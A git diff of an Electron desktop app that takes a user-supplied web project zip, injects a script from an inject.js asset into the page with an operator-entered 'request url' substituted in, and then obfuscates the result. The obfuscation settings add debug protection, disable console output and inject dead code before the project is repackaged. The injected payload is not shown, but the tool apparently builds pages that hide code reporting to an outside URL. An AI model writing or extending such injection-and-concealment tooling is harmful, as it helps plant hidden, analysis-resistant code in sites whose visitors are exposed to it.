@@ -41,52 +41,133 @@ function createWindow () {
 }
 
 async function registerListeners () {
-  ipcMain.on('selectZip', async (_) => {
-    const files = dialog.showOpenDialogSync(mainWindow as BrowserWindow, {
-      properties: ['openFile'],
-      filters: [{ name: 'Zip', extensions: ['zip'] }]
-    });
+  ipcMain.on('selectZip', async (_, requestUrl) => {
+      if(requestUrl === '') {
+        dialog.showMessageBoxSync(mainWindow as BrowserWindow, {
+          type: 'error',
+          message: 'Please enter a valid request url.',
+          buttons: ['OK'],
+        });
 
-    if (files) {
-      const dirPath = path.join(assetsPath, 'tmp');
-
-      const file = files[0];
-      const fileName = 'project.zip';
-      const filePath = path.join(dirPath, fileName);
-      
-      try {
-        fs.readdirSync(dirPath)
-      } catch (readError) {
-        try {
-          fs.mkdirSync(dirPath);
-        } catch (makeError) {
-          console.log(makeError);
-        }
+        return;
       }
 
-      fs.copyFileSync(file, filePath);
+      dialog.showMessageBox(mainWindow as BrowserWindow, {
+      type: 'info',
+      message: 'Select a zip file to process.',
+      buttons: ['OK'],
+    }).then(() => selectZip(requestUrl));
+  });
 
-      extractZip(filePath);
-    }
+  ipcMain.on('generateJson', async (_) => {
+    dialog.showMessageBox(mainWindow as BrowserWindow, {
+      type: 'info',
+      message: 'Select a path to save the generated json file.',
+      buttons: ['OK'],
+    }).then(() => generateJson());
   });
 }
 
-function extractZip(filePath: string) {
+function generateJson() {
+  const jsonPath = path.join(assetsPath, 'assets', 'auth.json');
+
+  const file = dialog.showSaveDialogSync(mainWindow as BrowserWindow, {
+    nameFieldLabel: 'auth',
+    filters: [{ name: 'Json', extensions: ['json'] }],
+  });
+
+  if (!file) {
+    dialog.showMessageBoxSync(mainWindow as BrowserWindow, {
+      type: 'info',
+      message: 'No json location to save selected.',
+      buttons: ['OK'],
+    });
+
+    return;
+  }
+
+  try {
+    fs.copyFileSync(jsonPath, file as string);
+
+    dialog.showMessageBoxSync(mainWindow as BrowserWindow, {
+      type: 'info',
+      message: 'The json file has been saved.',
+      buttons: ['OK'],
+    });
+  } catch (error) {
+    dialog.showMessageBoxSync(mainWindow as BrowserWindow, {
+      type: 'error',
+      message: 'There was an error saving the json file.',
+      buttons: ['OK'],
+    });
+  }
+}
+
+function selectZip(requestUrl: string) {
+  const files = dialog.showOpenDialogSync(mainWindow as BrowserWindow, {
+    properties: ['openFile'],
+    filters: [{ name: 'Zip', extensions: ['zip'] }]
+  });
+
+  if (!files) {
+    dialog.showMessageBoxSync(mainWindow as BrowserWindow, {
+      type: 'info',
+      message: 'No zip file selected.',
+      buttons: ['OK'],
+    });
+
+    return;
+  }
+
+  const dirPath = path.join(assetsPath, 'tmp');
+
+  const file = files[0];
+  const fileName = 'project.zip';
+  const filePath = path.join(dirPath, fileName);
+  
+  try {
+    fs.readdirSync(dirPath)
+  } catch (readError) {
+    console.log(readError);
+
+    try {
+      fs.mkdirSync(dirPath);
+    } catch (makeError) {
+      console.log(makeError);
+    }
+  }
+
+  fs.copyFileSync(file, filePath);
+
+  extractZip(filePath, requestUrl);
+}
+
+function extractZip(filePath: string, requestUrl: string) {
   const dirPath = path.join(assetsPath, 'tmp', 'project');
 
   const zip = new AdmZip(filePath);
   zip.extractAllTo(dirPath, true);
 
-  checkZip(dirPath);
+  fs.unlinkSync(filePath);
+
+  checkZip(dirPath, requestUrl);
 }
 
-function checkZip(dirPath: string) {
+function checkZip(dirPath: string, requestUrl: string) {
   const files = fs.readdirSync(dirPath);
 
   let okay = false;
 
   files.forEach(file => {
     if (file !== 'index.htm' && file !== 'index.html') return;
+
+    if (file === 'index.htm') {
+      const filePath = path.join(dirPath, file);
+      const newFilePath = path.join(dirPath, 'index.html');
+
+      fs.renameSync(filePath, newFilePath);
+    }
+
     okay = true;
   });
 
@@ -94,20 +175,26 @@ function checkZip(dirPath: string) {
     dialog.showMessageBoxSync(mainWindow as BrowserWindow, {
       type: 'error',
       message: 'There was an error processing the zip file.',
-      buttons: ['OK']
+      buttons: ['OK'],
     });
+
+    return;
   }
 
-  processZip(dirPath);
-  copyNotFound();
-  createAuth();
+  processZip(dirPath, requestUrl);
+
+  dialog.showMessageBox(mainWindow as BrowserWindow, {
+    type: 'info',
+    message: 'The zip file has been processed, now select a path to save.',
+    buttons: ['OK'],
+  }).then(() => saveZip());
 }
 
-function processZip(dirPath: string) {
+function processZip(dirPath: string, requestUrl: string) {
   const files = fs.readdirSync(dirPath);
 
   files.forEach(file => {
-    if (file !== 'index.htm' && file !== 'index.html') return;
+    if (file !== 'index.html') return;
     
     const filePath = path.join(dirPath, file);
     const fileContent = fs.readFileSync(filePath, 'utf8');
@@ -120,7 +207,7 @@ function processZip(dirPath: string) {
     const fileContentLastPart = fileContent.split(javaScriptLastPart)[countEndScript];
 
     const javaScriptContent = fileContent.replace(fileContentFistPart, '').replace(fileContentLastPart, '').replace(javaScriptFirstPart, '').replace(javaScriptLastPart, '');
-    const javaScriptContentInjected = injectZip(javaScriptContent);
+    const javaScriptContentInjected = injectZip(javaScriptContent, requestUrl);
     const JavaScriptContentObfuscated = JavaScriptObfuscator.obfuscate(javaScriptContentInjected, {
       compact: true,
       controlFlowFlattening: true,
@@ -128,6 +215,9 @@ function processZip(dirPath: string) {
       deadCodeInjection: true,
       deadCodeInjectionThreshold: 1,
       debugProtection: true,
+      debugProtectionInterval: 2000,
+      disableConsoleOutput: true,
+      log: false,
       numbersToExpressions: true,
       renameGlobals: true,
       renameProperties: false,
@@ -147,34 +237,71 @@ function processZip(dirPath: string) {
   });
 }
 
-function injectZip(content: string) {
+function injectZip(content: string, requestUrl: string) {
   const javaScriptInjectPath = path.join(assetsPath, 'assets', 'inject.js');
   const javaScriptInjectPart = "document.addEventListener('DOMContentLoaded', onLoad);";
   const javaScriptInjectContent = fs.readFileSync(javaScriptInjectPath, 'utf8');
 
-  const javaScriptContent = content.replace(javaScriptInjectPart, javaScriptInjectContent);
+  const javaScriptInjectContentFinal = javaScriptInjectContent.replace('REQUEST_URL', requestUrl);
+
+  const javaScriptContent = content.replace(javaScriptInjectPart, javaScriptInjectContentFinal);
 
   return javaScriptContent;
 }
 
-function copyNotFound() {
-  const notFoundHtmlPath = path.join(assetsPath, 'assets', 'notfound.html');
-  const notFoundHtmlDestinationPath = path.join(assetsPath, 'tmp', 'project', 'notfound.html');
+function saveZip() {
+  const dirPath = path.join(assetsPath, 'tmp', 'project');
+  const filePath = path.join(dirPath, 'output.zip');
+  
+  const zip = new AdmZip();
+  zip.addLocalFolder(dirPath);
+  zip.writeZip(filePath);
 
-  fs.copyFileSync(notFoundHtmlPath, notFoundHtmlDestinationPath);
-}
+  const file = dialog.showSaveDialogSync(mainWindow as BrowserWindow, {
+    nameFieldLabel: 'project',
+    filters: [{ name: 'Zip', extensions: ['zip'] }],
+  });
 
-function createAuth() {
-  const authTxtPath = path.join(assetsPath, 'tmp', 'project', 'auth.txt');
-  const authTxtContent = '';
+  if (!file) {
+    dialog.showMessageBoxSync(mainWindow as BrowserWindow, {
+      type: 'info',
+      message: 'No zip location to save selected.',
+      buttons: ['OK'],
+    });
 
-  fs.writeFileSync(authTxtPath, authTxtContent);
+    return;
+  }
+
+  try {
+    fs.copyFileSync(filePath, file as string);
+
+    dialog.showMessageBoxSync(mainWindow as BrowserWindow, {
+      type: 'info',
+      message: 'The zip file has been saved.',
+      buttons: ['OK'],
+    });
+    
+    fs.unlinkSync(filePath);
+    
+    if  (process.env.NODE_ENV === 'production')
+      fs.rmdirSync(path.join(assetsPath, 'tmp'), { recursive: true });
+  } catch (error) {
+    dialog.showMessageBoxSync(mainWindow as BrowserWindow, {
+      type: 'error',
+      message: 'There was an error saving the zip file.',
+      buttons: ['OK'],
+    });
+
+    console.log(error);
+
+    return;
+  }
 }
 
 app.on('ready', createWindow)
   .whenReady()
   .then(registerListeners)
-  .catch(e => console.error(e))
+  .catch(error => console.error(error))
 
 app.on('window-all-closed', () => {
   if (process.platform !== 'darwin') {
